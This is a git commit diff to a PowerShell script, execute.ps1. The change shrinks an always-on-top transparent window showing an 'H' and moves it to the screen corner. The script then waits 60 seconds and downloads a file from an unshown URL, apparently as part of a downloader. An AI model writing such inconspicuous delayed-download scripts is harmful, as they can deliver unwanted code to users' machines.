4b525945c568722e2389e35794c698387d70fdeb
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-06 11:58:51 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -6,23 +6,26 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 $form = New-Object System.Windows.Forms.Form
-$form.StartPosition = 'CenterScreen'
+$form.StartPosition = 'Manual' 
 $form.FormBorderStyle = 'None'
 $form.BackColor = [System.Drawing.Color]::Lime
 $form.TransparencyKey = $form.BackColor
 $form.TopMost = $true
-$form.Width = 100
-$form.Height = 100
+$form.Width = 30 
+$form.Height = 30
 
 $label = New-Object System.Windows.Forms.Label
 $label.Text = "H"
 $label.ForeColor = [System.Drawing.Color]::Green
-$label.Font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
+$label.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
 $label.AutoSize = $true
 $label.BackColor = [System.Drawing.Color]::Transparent
 
 $form.Controls.Add($label)
-$label.Location = New-Object System.Drawing.Point(($form.Width - $label.Width) / 2, ($form.Height - $label.Height) / 2)
+
+$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
+$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
+$form.Location = New-Object System.Drawing.Point($screenWidth - $form.Width, $screenHeight - $form.Height)
 
 $form.Add_MouseDown({
     $form.Capture = $false
@@ -30,13 +33,7 @@ $form.Add_MouseDown({
 
 $form.Show()
 
-$form.Location = New-Object System.Drawing.Point(
-    [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width / 2 - $form.Width / 2,
-    [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height / 2 - $form.Height / 2
-)
-
 Start-Sleep -Seconds 60
-
 $webClient.DownloadFile($url, $downloadPath)
 
 function IsProcessRunning {
